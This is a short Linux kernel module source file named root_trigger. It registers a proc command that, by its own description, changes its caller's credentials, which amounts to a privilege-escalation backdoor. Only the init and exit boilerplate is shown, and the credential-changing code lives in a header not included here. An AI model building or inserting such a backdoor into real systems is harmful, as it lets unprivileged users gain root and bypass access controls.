// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>

#include "trigger.h"

static int __init root_trigger_init(void)
{
	return trigger_create();
}

static void __exit root_trigger_exit(void)
{
	trigger_remove();
}

module_init(root_trigger_init);
module_exit(root_trigger_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Proc command that changes its caller's credentials");
